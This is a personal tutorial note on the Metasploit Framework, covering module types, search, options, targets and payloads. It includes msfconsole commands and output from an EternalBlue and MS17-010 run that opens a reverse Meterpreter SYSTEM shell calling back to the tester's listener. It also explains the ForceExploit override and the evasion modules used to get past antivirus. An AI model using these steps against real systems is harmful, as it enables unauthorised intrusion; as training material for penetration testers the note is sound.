---
created: 2026-04-08
---

>[!note]+ This guide covers the Metasploit Framework end-to-end, from architecture to post-exploitation session management. Meterpreter and `msfvenom` are covered in separate notes.
>- [[Meterpreter]]
>- [[msfvenom]]
>
## Metasploit

The **Metasploit Project** is a computer security platform maintained by **Rapid7** that centralizes vulnerability research, exploit development, and penetration testing into a single, unified framework. Its best-known sub-project is the **Metasploit Framework**.

>The **[Metasploit Framework (MSF)](https://docs.rapid7.com/metasploit/msf-overview/)** is a Ruby-based, modular, open-source penetration testing platform designed for vulnerability assessment, exploit development, and post-exploitation activities.

- At its core, MSF is a collection of reusable, structured modules that can be composed into complete attack chains. It's one of the most well-known and widely-used penetration testing tools.

>[!note]+ Installation
> 
> ```bash
> sudo apt install metasploit-framework
> ```



- In a nutshell, Metasploit attack chain looks like this:

```mermaid
---
config:
  theme: 'base'
  themeVariables:
    primaryColor: '#131924'
    primaryTextColor: '#ff0000'
    primaryBorderColor: '#131924'
    lineColor: '#6c0000'
    secondaryTextColor: '#006100'
---
graph LR
  A(Enumerate target) --> B(Identify services + versions) 
  B --> X(Choose exploit)
  X --> C(Select payload)
  C --> D(Configure options)
  D --> E(Check)
  E --> F(Execute)
  F --> J(Session)
```

- An **exploit** is the code that triggers a vulnerability to get code execution. It doesn't run anything on its own, but delivers the payload.
- A **payload** is the code that actually runs on the target after the exploit succeeds. It defines what you get: a shell, a Meterpreter agent, a user added, etc.
- A **handler** is the listener on your side. For reverse payloads, the handler waits for the payload's callback. For bind payloads, the handler actively connects to the port opened by the payload on the target.
- A session is an active connection to the compromised system, registered and managed by MSF after payload execution.

### Metasploit directory structure

- By default, all files related to Metasploit Framework can be found under `/usr/share/metasploit-framework`:

```bash
ls /usr/share/metasploit-framework
```

> [!example]+
> ```bash
> ls /usr/share/metasploit-framework --group-directories-first
> ```
> ```bash
> app            plugins                       msfconsole       msfvenom
> config         scripts                       msfd             msf-ws.ru
> data           tools                         msfdb            Rakefile
> db             vendor                        msf-json-rpc.ru  ruby
> documentation  Gemfile                       msfrpc           script-exploit
> lib            Gemfile.lock                  msfrpcd          script-password
> modules        metasploit-framework.gemspec  msfupdate        script-recon
> ```

- Core directories:
	- `lib/` -> core framework code (APIs, networking, execution engine).
	- `app/` -> web/service components (RPC, web interface logic).
	- `config/` -> framework configuration files.
	- `documentation/` -> official module and framework documentation.
	- `db/` → cached metadata, module indexing, workspace data.
	- `data/` -> static resources (payload binaries, wordlist, templates)/
	- `modules/` -> all exploit/auxiliary/payload modules (actual attack logic).
	- `plugins/` → extensions that add functionality to `msfconsole`.
	- `tools/` → standalone helper utilities and dev tools.
	- `scripts/` → legacy automation and Meterpreter scripts.
	- `vendor/` → third-party libraries bundled with framework.

- Executables:
	- `msfconsole` → main interactive interface.
	- `msfvenom` → payload generator.
	- `msfdb` → database manager.
	- `msfrpcd` / `msfrpc` → remote control API server.
	- `msfupdate` → update framework.

- Build and Ruby ecosystem:
	- `Gemfile` → Ruby dependencies definition.
	- `Gemfile.lock` → locked dependency versions.
	- `metasploit-framework.gemspec` → `gem` specification.
	- `Rakefile` → build/automation tasks.
	- `ruby/` → embedded Ruby runtime.

- Other:
	- `msfd` → daemonized framework service.
	- `msf-ws.ru` -> **Ruby script** used by the **Metasploit Framework** to start and manage its **web service** (API), typically run via the `thin` web server on **localhost port `5443`**.
	- `msf-json-rpc.ru` -> Rackup configuration file used to start the Metasploit Framework's JSON-RPC web service.
	- `script-*` → categorized helper wrappers (`exploit`, `recon`, `password`).

## msfconsole

>The **Metasploit Framework Console (`msfconsole`)** is the primary command-line interface for interacting with the Metasploit Framework.

- Start the metasploit console:

```bash
msfconsole
```

>[!example]- `msfconsole`
> ```bash
> msfconsole
> ```
> 
> ```bash
> Metasploit tip: Start commands with a space to avoid saving them to history
>                                                   
> 
> MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
> MMMMMMMMMMM                MMMMMMMMMM
> MMMN$                           vMMMM
> MMMNl  MMMMM             MMMMM  JMMMM
> MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
> MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
> MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
> MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
> MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
> MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
> MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
> MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
> MMMMR  ?MMNM             MMMMM .dMMMM
> MMMMNm `?MMM             MMMM` dMMMMM
> MMMMMMN  ?MM             MM?  NMMMMMN
> MMMMMMMMNe                 JMMMMMNMMM
> MMMMMMMMMMNm,            eMMMMMNMMNMM
> MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
> MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
>         https://metasploit.com
> 
> 
>        =[ metasploit v6.4.71-dev                          ]
> + -- --=[ 2529 exploits - 1302 auxiliary - 431 post       ]
> + -- --=[ 1669 payloads - 49 encoders - 13 nops           ]
> + -- --=[ 9 evasion                                       ]
> 
> Metasploit Documentation: https://docs.metasploit.com/
> 
> [msf](Jobs:0 Agents:0) >> 
> ```

>[!note] The banner is different each time.

- Skip the ASCII banner:

```bash
msfconsole -q
```

>[!note] The `msfconsole` supports most Linux commands, including `clear`, but doesn't allow you to use certain features of a regular command line, like output redirection.

- Useful commands:

| Command         | Description                             |
| --------------- | --------------------------------------- |
| `help` / `?`    | Show all available commands.            |
| `exit` / `quit` | Exit the console.                       |
| `clear`         | Clear the terminal screen.              |
| `ls`            | List the current directory contents.    |
| `cd`            | Change the current working directory.   |
| `history`       | Show command history.                   |
| `version`       | Show MSF version info.                  |
| `db_status`     | Show database connection status.        |
| `setg`          | Set a global option across all modules. |
| `unsetg`        | Unset a global option.                  |
| `save`          | Save the current configuration.         |

## Modules


>A **Metasploit module** is a self-contained software unit that implements a specific offensive or analytical task, including vulnerability exploitation, target scanning, information gathering, payload generation, or post-exploitation activity.

- Metasploit modules are stored at `/usr/share/metasploit-framework/modules`:

```bash
ls /usr/share/metasploit-framework/modules
```

```bash
auxiliary/
encoders/
evasion/
exploits/
nops/
payloads/
post/
README.md
```

There are seven main types of modules in Metasploit:

- **Exploit**
	- Exploit modules are used to **leverage specific vulnerabilities** on a target system to gain code execution.
	- They act as the entry point into the target system by triggering unintended behavior, such as buffer overflows, command injection, logic flaws, etc.
	- The code executed as a result of successful exploitation is known as the **payload**.

- **Payload**
	- Payload modules define the actions performed after an exploit succeeds, typically in the form of shellcode.
	- In most cases, payloads establish a **session** (e.g., reverse shell or Meterpreter), which gives interactive control over the compromised host.
	- However, payloads can also perform single, discrete actions, such as creating user accounts, executing commands, sending a callback (ping-back) to confirm code execution, etc.
	- Payloads can be used independently (e.g., via `msfvenom`) to generate standalone executables or raw shellcode for custom exploits.
	

- **Auxiliary**
	- Auxiliary modules do **not exploit vulnerabilities directly** and do not require payloads.
	- Instead, they provide supporting functionality for reconnaissance, enumeration, and interaction with services.
	- Common uses:
		- **Information Gathering** — port scanning, service detection, enumeration.
		- **Authentication Attacks** — brute-force and credential spraying.
		- **Service Interaction** — SMB, FTP, HTTP communication.
		- **Analysis** — password cracking, protocol analysis.
		- **Denial of Service (DoS)** — disrupting or crashing services.
		- **Server Emulation** — running fake services to capture credentials.

- **Encoder**
	- Encoder modules are used to **transform and obfuscate payloads** to evade detection or bypass constraints.
	- Their primary purposes are avoiding bad characters (e.g., null bytes in exploits) and evading signature-based detection (basic AV/IDS).
	- This can be, for example, XOR encoding or polymorphic transformations.

- **Evasion**
	- Evasion modules generate payloads specifically designed to **bypass modern security controls**, such as AV (antivirus) and EDR (endpoint detection and response).
	- They apply more advanced techniques than encoders, including payload transformation, sandbox evasion, and behavioral obfuscation.
	- In practice, encoders help payloads *get delivered*, and evasion modules help payloads *avoid detection during execution*.

- **NOP**
	- NOP (No Operation) modules generate sequences of instructions that **perform no meaningful action** but influence execution flow.
	- These are commonly used in memory corruption exploits, especially **buffer overflows**.

>[!note] Encoder and NOP modules are usually handled automatically by MSF. You rarely need to touch them directly unless you're developing custom exploits.

- **Post-exploitation**
	- Post-exploitation modules are used **after initial access is obtained**, typically through an active session.
	- They extend control over the compromised system and enable deeper access.
	- Common tasks:
		- **Privilege escalation**
		- **Credential dumping**
		- **System enumeration**
		- **Data exfiltration**
		- **Persistence**
		- **Lateral movement**
### Searching for modules

- Search for modules using the `msfconsole`'s `search` command:

```bash
msf> search <term1> <term2> ...
```

>[!example]+
> ```bash
> search eternalblue
> search type:exploit platform:windows smb ms17
> search type:auxiliary scanner ssh
> search cve:2021-41773
> ```

>[!example]+
> ```bash
> [msf](Jobs:0 Agents:0) >> search eternalblue
> 
> Matching Modules
> ================
> 
>    #   Name                                           Disclosure Date  Rank     Check  Description
>    -   ----                                           ---------------  ----     -----  -----------
>    0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
>    1     \_ target: Automatic Target                  .                .        .      .
>    2     \_ target: Windows 7                         .                .        .      .
>    3     \_ target: Windows Embedded Standard 7       .                .        .      .
>    4     \_ target: Windows Server 2008 R2            .                .        .      .
>    5     \_ target: Windows 8                         .                .        .      .
>    6     \_ target: Windows 8.1                       .                .        .      .
>    7     \_ target: Windows Server 2012               .                .        .      .
>    8     \_ target: Windows 10 Pro                    .                .        .      .
>    9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
>    10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
>    11    \_ target: Automatic                         .                .        .      .
>    12    \_ target: PowerShell                        .                .        .      .
>    13    \_ target: Native upload                     .                .        .      .
>    14    \_ target: MOF upload                        .                .        .      .
>    15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
>    16    \_ AKA: ETERNALROMANCE                       .                .        .      .
>    17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
>    18    \_ AKA: ETERNALBLUE                          .                .        .      .
>    19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
>    20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
>    21    \_ AKA: ETERNALROMANCE                       .                .        .      .
>    22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
>    23    \_ AKA: ETERNALBLUE                          .                .        .      .
>    24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
>    25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
>    26    \_ AKA: ETERNALBLUE                          .                .        .      .
>    27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
>    28    \_ target: Execute payload (x64)             .                .        .      .
>    29    \_ target: Neutralize implant                .                .        .      .
> 
> 
> Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
> After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
> 
> ```

>[!note] In Metasploit, a **target** refers to a specific operating system, software version, or configuration that an exploit module has been tested against, defined by a **name**, a **number (ID)**, and specific **options** such as return addresses or padding requirements.

- Output columns:

| Column            | Meaning                                                |
| ----------------- | ------------------------------------------------------ |
| `#`               | Search result index (you can `use` it, e.g., `use 0`). |
| `Name`            | Full module path.                                      |
| `Disclosure Date` | When the vulnerability was publicly disclosed.         |
| `Rank`            | Reliability rating.                                    |
| `Check`           | Whether a `check` command is available.                |
| `Description`     | Short description of what the module does.             |


- Common search keywords:

| Keyword               | Searches for...                                                  | Example             |
| --------------------- | ---------------------------------------------------------------- | ------------------- |
| `type:`               | Modules of specific type (`exploit`, `auxiliary`, `post`, etc.). | `type:exploit`      |
| `cve:`                | Modules with matching CVE ID.                                    | `cve:CVE-2017-0144` |
| `rank:`               | Modules with matching rank (numeric or descriptive).             | `rank:gte400`       |
| `platform:`           | Target platform (Windows, Linux, etc.).                          | `platform:windows`  |
| `arch:`               | CPU architecture (`x86`, `x64`, etc.).                           | `arch:x64`          |
| `port:`               | Modules targeting a specific port.                               | `port:445`          |
| `service:`            | Related service name (HTTP, SMB, FTP, etc.).                     | `service:smb`       |
| `name:`               | Matches module description/title.                                | `name:wordpress`    |
| `path:`               | Matches module path (more precise than name).                    | `path:scanner/smb`  |
| `author:`             | Modules written by a specific author.                            | `author:hdm`        |
| `check:`              | Modules that support `check` method.                             | `check:true`        |
| `target:`             | Specific target within module.                                   | `target:win7`       |
| `app:`                | Client-side vs server-side modules.                              | `app:server`        |
| `ref:` / `reference:` | Any reference (CVE, URL, advisory).                              | `ref:ms17-010`      |
| `edb:`                | Exploit-DB ID.                                                   | `edb:42315`         |
| `date:`               | Disclosure date.                                                 | `date:2017`         |

- Options:

| Option                             | Description                                                           |
| ---------------------------------- | --------------------------------------------------------------------- |
| `-h`, `--help`                     | Help banner.                                                          |
| `-I`, `--ignore`                   | Ignore the command if the only match has the same name as the search. |
| `-o`, `--output <filename>`        | Send output to a file in csv format.                                  |
| `-r`, `--sort-descending <column>` | Reverse the order of search results to descending order.              |
| `-S`, `--filter <filter>`          | Regex pattern used to filter search results.                          |
| `-s`, `--sort-ascending <column>`  | Sort search results by the specified column in ascending order.       |
| `-u`, `--use`                      | Use module if there is one result.                                    |

- Sort columns (`-s`):

| Column            | Description                                                         |
| ----------------- | ------------------------------------------------------------------- |
| `rank`            | Sort modules by their exploitability rank.                          |
| `date`            | Sort modules by their disclosure date. Alias for `disclosure_date`. |
| `disclosure_date` | Sort modules by their disclosure date.                              |
| `name`            | Sort modules by their name.                                         |
| `type`            | Sort modules by their type.                                         |
| `check`           | Sort modules by whether or not they have a `check` method.          |
| `action`          | Sort modules by whether or not they have actions.                   |

>[!important]+ `msf> search` vs. `searchsploit`
>- `mfs> search` command searches for 

>[!example]+ Examples 
> - Good-or-better exploits for Linux SSH, sorted by rank in descending order:
> 
> ```bash
> search type:exploit platform:linux rank:gte400 ssh -s type -r
> ```
> 
> - All SMB-related exploits for Windows:
> 
> ```bash
> search type:exploit platform:windows service:smb
> ```
> 
> - Windows local privilege escalation:
> 
> ```bash
> search type:exploit platform:windows local
> ```

> [!note]+ The `show` command
> There's also the `show` command that can be used to list all modules in a specific category. It doesn't support filters like `search`, just dumps a huge list of modules.
> 
> - List all modules:
> 
> ```bash
> show all
> ```
> 
> - List all exploits:
> 
> ```bash
> show exploits
> ```
> 
> - *Inside a module*, `show options` lists module options, `show targets` lists target the module supports, and `show payloads` lists compatible payloads.
> 
>>[!example]- `show exploits`
>>```bash
>>msf> show exploits
>>```
>> ```bash
>> Exploits
>> ========
>> 
>>    #     Name                                                                                Disclosure Date  Rank       Check  Description
>>    -     ----                                                                                ---------------  ----       -----  -----------
>>    0     exploit/aix/local/ibstat_path                                                       2013-09-24       excellent  Yes    ibstat $PATH Privilege Escalation
>>    1     exploit/aix/local/invscout_rpm_priv_esc                                             2023-04-24       excellent  Yes    invscout RPM Privilege Escalation
>>    2     exploit/aix/local/xorg_x11_server                                                   2018-10-25       great      Yes    Xorg X11 Server Local Privilege Escalation
>>    3     exploit/aix/rpc_cmsd_opcode21
>>    # ...
>> ```


#### Module ranking

- Every exploit module has a **rank** assigned based on its:
	- Reliability (will it actually give you a shell?)
	- Stability (will it crash the service?)
	- Speed (can you trust it without deep debugging?)
	
| Rank        | Numeric | Description                                                                                                          |
| ----------- | ------- | -------------------------------------------------------------------------------------------------------------------- |
| `Excellent` | `600`   | Near-guaranteed success; no service crash. Typical for SQLi, command injection; rare for memory corruption exploits. |
| `Great`     | `500`   | Highly reliable; has automatic target detection or version verification.                                             |
| `Good`      | `400`   | Reliable on default configurations; no auto-detection.                                                               |
| `Normal`    | `300`   | Works only on specific versions; requires accurate enumeration.                                                      |
| `Average`   | `200`   | ~50% success rate; often tricky exploitation.                                                                        |
| `Low`       | `100`   | <50% success rate; unreliable in most environments.                                                                  |
| `Manual`    | `0`     | ≤ 15% success rate; very unstable, basically a DoS; often requires manual tuning.                                    |

>[!note] To filter exploits by ranking, you can use either descriptive or numeric values.
>- With numeric rank, the format is this:
>```bash
>search rank:<operator><value>
>```

- `Good` exploits:

```bash
search rank:good
```

- `Good`, `Great`, or `Excellent`:

```bash
search rank:gte400 
```

- `Great` or `Excellent` only:

```bash
search rank:gte500 
```

- Exactly `Excellent`:

```bash
search rank:500
```

```bash
search rank:excellent
```


>[!note]+ Comparison operators Metasploit understands
>- `gte` -> `≥`
>- `gt` -> `>`
>- `lte` -> `≤`
>- `lt` -> `<`



### Using modules

```mermaid
---
config:
  theme: 'base'
  themeVariables:
    primaryColor: '#131924'
    primaryTextColor: '#ff0000'
    primaryBorderColor: '#131924'
    lineColor: '#6c0000'
    secondaryTextColor: '#006100'
    fontFamily: 'JetBrains Mono'
---
graph LR
  A(search) --> B(use)
  B --> C(show options)
  C --> D(set)
  D --> E(check)
  E --> F(run/exploit)
```

- Common module commands:

| Command                       | Description                                                                             |
| ----------------------------- | --------------------------------------------------------------------------------------- |
| `search <keyword>`            | Search for modules by name, description, CVE, or filters.                               |
| `use <module>`                | Load a module by name or search index.                                                  |
| `back`                        | Exit the current module context and return to main prompt.                              |
| `info`                        | Display detailed information about the selected module (description, targets, options). |
| `show payloads`               | Show payloads compatible with the selected module.                                      |
| `show options` /<br>`options` | Display required and optional parameters for the current module.                        |
| `show missing`                | Show required options that have not yet been set.                                       |
| `show advanced`               | Display advanced module options not shown by default.                                   |
| `show evasion`                | Show evasion-related options (if supported by the module).                              |
| `show targets`                | Display supported target platforms/versions for the module.                             |
| `set <option> <value>`        | Set a module-specific option (e.g., `RHOSTS`, `LHOST`).                                 |
| `setg <option> <value>`       | Set a global option applied across modules.                                             |
| `unset <option>`              | Remove a previously set module option.                                                  |
| `unsetg <option>`             | Remove a global option.                                                                 |
| `advanced`                    | Show advanced options for one or more modules (similar to `show advanced`).             |
| `reload_all`                  | Reload all modules from disk (useful after updates or edits).                           |
| `loadpath <path>`             | Load additional modules from a custom directory.                                        |
| `favorite <module>`           | Add a module to favorites for quick access.                                             |
| `favorites`                   | List saved favorite modules.                                                            |
| `clearm`                      | Clear the module stack.                                                                 |
| `pushm`                       | Push the current module onto the stack.                                                 |
| `popm`                        | Pop the last module from the stack and activate it.                                     |
| `previous`                    | Switch back to the previously used module.                                              |
| `listm`                       | List modules currently stored in the module stack.                                      |

#### Selecting a module

- By index from search results:

```bash
use 0
```

- By full path:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

```bash
use auxiliary/scanner/smb/smb_ms17_010
```

- Exit the current module context:

```bash
back
```
#### Getting module information

- Display detailed information about the selected module (description, targets, options):

```bash 
info
```

- Extended details:

```bash
info -d
```

#### Options

- Display all available options for the selected exploit and the currently selected payload, both required and optional:

```bash
show options
```

>[!example]- Example: `show options`
> ```bash
> show options
>```
>```bash 
> Module options (exploit/windows/smb/ms17_010_psexec):
> 
>    Name                 Current Setting       Required  Description
>    ----                 ---------------       --------  -----------
>    DBGTRACE             false                 yes       Show extra debug trace info
>    LEAKATTEMPTS         99                    yes       How many times to try to leak tr
>                                                         ansaction
>    NAMEDPIPE                                  no        A named pipe that can be connect
>                                                         ed to (leave blank for auto)
>    NAMED_PIPES          /usr/share/metasploi  yes       List of named pipes to check
>                         t-framework/data/wor
>                         dlists/named_pipes.t
>                         xt
>    RHOSTS                                     yes       The target host(s), see https://
>                                                         docs.metasploit.com/docs/using-m
>                                                         etasploit/basics/using-metasploi
>                                                         t.html
>    RPORT                445                   yes       The Target port (TCP)
>    SERVICE_DESCRIPTION                        no        Service description to be used o
>                                                         n target for pretty listing
>    SERVICE_DISPLAY_NAM                        no        The service display name
>    E
>    SERVICE_NAME                               no        The service name
>    SHARE                ADMIN$                yes       The share to connect to, can be
>                                                         an admin share (ADMIN$,C$,...) o
>                                                         r a normal read/write folder sha
>                                                         re
>    SMBDomain            .                     no        The Windows domain to use for au
>                                                         thentication
>    SMBPass                                    no        The password for the specified u
>                                                         sername
>    SMBUser                                    no        The username to authenticate as
> 
> 
> Payload options (windows/meterpreter/reverse_tcp):
> 
>    Name      Current Setting  Required  Description
>    ----      ---------------  --------  -----------
>    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, proce
>                                         ss, none)
>    LHOST     94.237.122.225   yes       The listen address (an interface may be specifie
>                                         d)
>    LPORT     4444             yes       The listen port
> 
> 
> Exploit target:
> 
>    Id  Name
>    --  ----
>    0   Automatic
> 
> 
> 
> View the full module info with the info, or info -d command.
> ```

>[!note] MSF won't run an exploit until all required fields are filled. 

- Show required options that have not yet been set:

```bash
show missing
```

- Display advanced module options not shown by default:

```bash
show advanced
```



| Option    | Description                                                     |
| --------- | --------------------------------------------------------------- |
| `RHOSTS`  | Target IP address, address range, or CIDR — the remote host(s). |
| `RPORT`   | Remote port to target.                                          |
| `LHOST`   | Your attacking machine's IP (needed for reverse payloads).      |
| `LPORT`   | Local port to listen on for reverse connections.                |
| `PAYLOAD` | The payload to use with the exploit.                            |
| `SESSION` | Active session ID (for post-exploitation modules).              |
| `THREADS` | Concurrent threads (for scanner/auxiliary modules).             |
| `VERBOSE` | Enable verbose output.                                          |

- Set an option for a module:

```bash
set RHOSTS 10.129.0.11
```
```bash
set RPORT 445
```

- Set a **global** option that persists across all modules:

```bash
setg LHOST 10.10.15.12
```
```bash
setg RHOSTS 10.129.0.11
```

- Unset a previously set value:

```bash
unset LHOST
```
```bash
unsetg RHOSTS
```

#### Targets

>In exploit modules, **targets** define the exact operating system, version, and architecture against which an exploit has been tested and verified to work successfully.

- List available targets:

```bash
show targets
```


>[!example]+ Example: `show targets`
> ```bash
> show targets
> ```
> 
> ```bash
> Exploit targets:
> =================
> 
>     Id  Name
>     --  ----
> =>  0   Automatic
>     1   PowerShell
>     2   Native upload
>     3   MOF upload
> ```



>[!note] Target `0: Automatic` tells MSF to probe the remote service, fingerprint its version, and select the appropriate target automatically. 

-  Set a specific target manually when you _know_ the version and automatic detection isn't working:

```bash
set target 1
```

>[!warning] Getting the target wrong in a memory corruption exploit means either a crash (no session) or unreliable behavior. 

#### The `check` command

- Many modules support a pre-flight check triggered by the `check` command:

```bash
check
```

`check` probes the target to assess whether it's likely vulnerable — banner grabbing, version comparison, or lightweight protocol interaction — without triggering the full exploit. It returns one of:
- `Target is vulnerable` → proceed with confidence.
- `Target appears vulnerable` → version matches but execution isn't guaranteed.
- `Target is not vulnerable` → move on, find another vector.
- `Cannot reliably check` → make a judgment call.

>[!tip] **Always run `check` if available**
>- But never blindly trust it.

>[!warning] Not all modules support `check`. 

>[!warning] Not all checks are safe. Some checks are passive (safe), others are active (semi-intrusive).


- Some modules implement `AutoCheck`, which runs the check automatically before attempting exploitation. You can override this behavior:

```bash
set AutoCheck false       # Disable automatic pre-check
```
```bash
set ForceExploit true     # Run even if check says not vulnerable
```

#### Running the module

- Run the module:

```bash
run
```

- Or the alias:

```bash
exploit
```

- Run as a background job (keeps console free for other tasks):

```bash
run -j
```
```bash
exploit -j
```

> [!example]+ Example: `run`
> ```bash
> run
> ```
> 
> ```bash
> [*] Started reverse TCP handler on 10.10.15.12:4444 
> [*] 10.129.164.48:445 - Target OS: Windows Server 2016 Standard 14393
> [*] 10.129.164.48:445 - Built a write-what-where primitive...
> [+] 10.129.164.48:445 - Overwrite complete... SYSTEM session obtained!
> [*] 10.129.164.48:445 - Selecting PowerShell target
> [*] 10.129.164.48:445 - Executing the payload...
> [+] 10.129.164.48:445 - Service start timed out, OK if running a command or non-service executable...
> [*] Sending stage (177734 bytes) to 10.129.164.48
> [*] Meterpreter session 1 opened (10.10.15.12:4444 -> 10.129.164.48:49671) at 2025-10-13 01:51:27 -0500
> 
> (Meterpreter 1)(C:\Windows\system32) > shell
>
>C:\Windows\system32> 
> ```
> Upon execution of this module, you now have a shell on the target machine. You can interact with it as usual:
> ```PowerShell
> C:\Windows\system32> whoami
>```
>```PowerShell
>  whoami
> nt authority\system
> ```

### Reading module output

- MSF prefixes every output line with a tag that tells you the severity:

| Prefix | Meaning                            |
| ------ | ---------------------------------- |
| `[*]`  | Informational — normal progress.   |
| `[+]`  | Success — something good happened. |
| `[-]`  | Failure or error.                  |
| `[!]`  | Warning — proceed with caution.    |
| `[~]`  | Important note.                    |

- A completed exploit run is not the same as a successful one:

	- `[*] Meterpreter session 1 opened` <- success.
	- `[*] Command shell session 1 opened` <- success.
	- `[*] Exploit completed, but no session was created.` <- failure.

>[!important] A module run is considered successful if a session has been opened as a result. 

- Verify explicitly:

```bash
sessions -l
```

- Common reasons why exploit code might run successfully but the payload never called back to create a session:
	- Wrong payload architecture (e.g., 32-bit payload on 64-bit target).
	- Firewall blocking the reverse connection.
	- Wrong `LHOST` (private IP address vs. VPN IP address).
	- Target is not actually vulnerable (even despite `check` saying so).
	- Service crashed before payload executed

- So, simply `Exploit completed` doesn't mean success. It only means that the module finished running.

## Payloads

> A **Metasploit payload** is the executable code delivered to a target system following successful exploitation, responsible for establishing communication with the attacker or performing a specific post-exploitation action.

- The payload determines **what actions an attacker can perform** once access is gained, ranging from simple command shells to advanced Meterpreter sessions.

>[!important] For each exploit, a payload is always selected.
> - The **exploit module** attempts to leverage a vulnerability to run code on the target.
> - The **payload module** is the code that’s actually executed on the target after exploitation.

- Metasploit payloads are stored at `/usr/share/metasploit-framework/modules/payloads`:

```bash
ls /usr/share/metasploit-framework/modules/payloads
```

>[!example]+
> ```bash
> cd /usr/share/metasploit-framework/modules/payloads && ls -R ./*
> ```
> 
> ```bash
> ./adapters:
> cmd  php
> 
> ./singles:
> aix        bsd   firefox  linux      osx     r        tty
> android    bsdi  generic  mainframe  php     ruby     windows
> apple_ios  cmd   java     nodejs     python  solaris
> 
> ./stagers:
> android  bsd  bsdi  java  linux  multi  netware  osx  php  python  windows
> 
> ./stages:
> android  bsd  bsdi  java  linux  multi  netware  osx  php  python  windows
> ```

- Each Metasploit payload has the following location structure:

```
<platform>/<arch>/<stage>/<stager>
```

- For, example, `windows/x64/meterpreter/reverse_tcp`:
	- `windows` -> target OS
	- `x64` -> architecture
	- `meterpreter` -> stage (capability)
	- `reverse_tcp` -> stager (communication)

The **last part = how you connect**  
The **middle part = what you get**
### Payload types

There are three types of Metasploit payloads:

- **Singles**
	- **Single payloads** are **self-contained**, standalone payloads that include the complete shell code for the selected task (e.g., creating a user, running a simple command, or creating a bind shell).
	- Everything needed is packaged together — no callbacks, no staging, no second download.
	- They work even without reliable network access back to you (for bind shells, or exec-type payloads that don't need a persistent channel). 
	- Singes are considered more stable, but they tend to be larger, which can be an issue with exploits that have tight size constraints. 
	  
- **Stagers**
	- **Stager payloads** are small, lightweight payloads that set up a communication channel between the attacker and the target machine.
	- Their only job is to establish network connectivity and _then_ pull down the actual payload — the **stage**.
	- Stagers are tiny by design — small enough to fit in constrained exploit scenarios — and they decouple transport from capability, so that you can pair the same Meterpreter *stage* (capability) with different *stagers* (transport) — TCP, HTTP, HTTPS, named pipe, etc.

- **Stages**
	- **Stage payloads** are the capability layer — the feature-rich code loaded by stagers. They leverage the infrastructure provided by stagers to execute a specific task.
	- The most common stage is **Meterpreter**, which gives you an in-memory post-exploitation framework.
	- Others include `shell` (raw `cmd`/`bash`), `vncinject` (GUI access), and `powershell`.

>[!note]+ Staged vs. stateless payloads naming convention
> 
> 
> If you look at Metasploit's payload list, you notice some payloads have the same name but in different formats. One is a staged payload, another is a singler.
> 
> - `windows/shell/reverse_tcp` <- staged (stager + stage, delivered separately).
> - `windows/shell_reverse_tcp` <- single.
> ---
> - `windows/meterpreter/reverse_tcp` <- staged.
> - `windows/meterpreter_reverse_tcp` <- single.
> ---
> 
> - `/` → **staged payload**.
> - `_` → **single (stageless) payload**.

>A staged payload consists of **two components (stager + stage)** that are **logically bundled together in Metasploit**, but **delivered and executed separately at runtime**.

- So, when you deliver `windows/shell/reverse_tcp` to the target machine, for example, you are actually sending the loader first. And then when that loader gets executed, it will ask the handler (on the attacker’s end) to send over the final stage (the larger payload), and finally you get a shell.

- Generally, Meterpreter is the most popular payload type for Metasploit. 
	- If you are testing a Windows exploit, it’s better to use `windows/meterpreter/reverse_tcp`. 
	- If you’re on Linux, try `linux/meterpreter/reverse_tcp`. 
- You should always choose a *native* Meterpreter if you can (`windows/meterpreter` for Windows, `linux/meterpreter` for Linux, etc.).
- If you are unable to, try a cross-platform one, such as `java/meterpreter/reverse_tcp`. 

>[!note] For more about Meterpreter, see [[Meterpreter]].
### Using payloads

- List payloads compatible with the selected exploit (run once the exploit is chosen):

```bash
show payloads
```

>[!tip]+
> You can also use `grep` to filter payloads:
> ```bash
> grep meterpreter grep reverse show payloads
> ```

>[!example]+ Example: `show payloads` with `grep`
> - Suppose you want to create a reverse shell handled by Meterpreter for your exploit. You'd search for:
> ```bash
> exploit(windows/smb/ms17_010_eternalblue) >> grep meterpreter grep reverse show payloads
> ```
> 
> ```bash
>    28  payload/windows/x64/meterpreter/reverse_http        .                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
>    29  payload/windows/x64/meterpreter/reverse_https       .                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
>    30  payload/windows/x64/meterpreter/reverse_named_pipe  .                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
>    31  payload/windows/x64/meterpreter/reverse_tcp         .                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
